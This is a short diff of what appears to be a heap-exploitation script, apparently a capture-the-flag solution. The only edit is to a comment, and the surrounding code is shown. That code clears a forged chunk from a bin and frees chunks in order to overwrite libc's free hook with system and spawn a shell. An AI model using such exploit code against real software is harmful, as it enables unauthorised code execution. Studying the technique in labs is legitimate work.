@@ -107,7 +107,7 @@ def main():
 
     # Overwrite free_hook within the libc with libc system and run free to spawn a shell
     for _ in range(4): # Get rid of the forged chunk from the large bin first - otherwise we end up with a piece off that chunk that does not go into the tcache
-        alloc(0xef, b'bruh') # We can allocate to a size of at most 0xff, so we can only incrementally get rid of this forged chunk
+        alloc(0xef, b'bruh') # We can allocate to a size of at most 0xff, so we can only incrementally get rid of this forged chunk from the bin
     alloc(0x30, b'G'*0x8)
     free()
     free()
